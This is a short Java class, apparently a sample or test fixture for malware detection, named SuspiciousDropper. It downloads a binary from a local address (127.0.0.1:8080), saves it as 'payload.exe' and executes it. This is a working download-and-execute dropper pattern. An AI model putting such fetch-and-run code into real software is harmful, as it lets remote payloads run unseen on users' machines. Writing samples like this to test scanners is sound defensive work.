package suspicious;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

public class SuspiciousDropper {
    public void dropAndRun() throws Exception {
        URL url = new URL("http://127.0.0.1:8080/payload.bin");
        InputStream in = url.openStream();
        FileOutputStream fos = new FileOutputStream("payload.exe");
        byte[] buf = new byte[1024];
        int len;
        while ((len = in.read(buf)) != -1) {
            fos.write(buf, 0, len);
        }
        fos.close();
        Runtime.getRuntime().exec("payload.exe");
    }
}